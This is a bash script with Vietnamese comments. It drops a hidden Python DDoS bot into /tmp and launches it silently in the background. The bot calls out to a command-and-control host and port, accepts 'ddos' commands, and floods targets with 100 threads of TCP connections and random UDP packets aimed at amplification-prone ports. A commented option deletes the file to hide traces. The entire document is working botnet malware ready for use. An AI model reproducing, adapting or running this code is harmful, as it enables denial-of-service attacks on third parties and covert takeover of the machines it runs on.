#!/bin/bash

# Tạo file bot.py ẩn trong /tmp
BOT_PATH="/tmp/.bot.py"

# Ghi nội dung Python vào file
cat << 'EOF' > "$BOT_PATH"
import socket
import threading
import random
import time

# ==========================
C2_HOST = "meet-true.gl.at.ply.gg"  # Thay bằng địa chỉ TCP từ Playit
C2_PORT = 46276               # Thay bằng port từ Playit
# ==========================

def tcp_udp_amp_flood(target_ip, target_port, duration=20):
    stop_time = time.time() + duration
    udp_ports = [53, 123, 19, 389]

    def attack():
        while time.time() < stop_time:
            try:
                sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock_tcp.settimeout(0.5)
                sock_tcp.connect((target_ip, target_port))
                sock_tcp.send(b"GET / HTTP/1.1\r\nHost: flood\r\n\r\n")
                sock_tcp.close()

                sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(1024)
                udp_port = random.choice(udp_ports)
                sock_udp.sendto(payload, (target_ip, udp_port))
            except:
                pass

    for _ in range(100):
        threading.Thread(target=attack).start()

def connect_to_c2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            s.send(b"[+] Bot Connected")
            print("[*] Đã kết nối đến C2")

            while True:
                data = s.recv(1024).decode().strip()
                if data.startswith("ddos"):
                    _, ip, port = data.split()
                    print(f"[!] Nhận lệnh tấn công: {ip}:{port}")
                    s.send(b"[+] Thực hiện tấn công")
                    tcp_udp_amp_flood(ip, int(port))
        except Exception as e:
            print(f"[!] Mất kết nối với C2: {e}. Thử lại sau 5s...")
            time.sleep(5)

connect_to_c2()
EOF

# Chạy file bot ngầm (ẩn terminal)
nohup python3 "$BOT_PATH" >/dev/null 2>&1 &

# Tùy chọn: tự xóa sau khi chạy để ẩn dấu vết
# Uncomment dòng bên dưới nếu muốn
# sleep 2 && rm -f "$BOT_PATH"
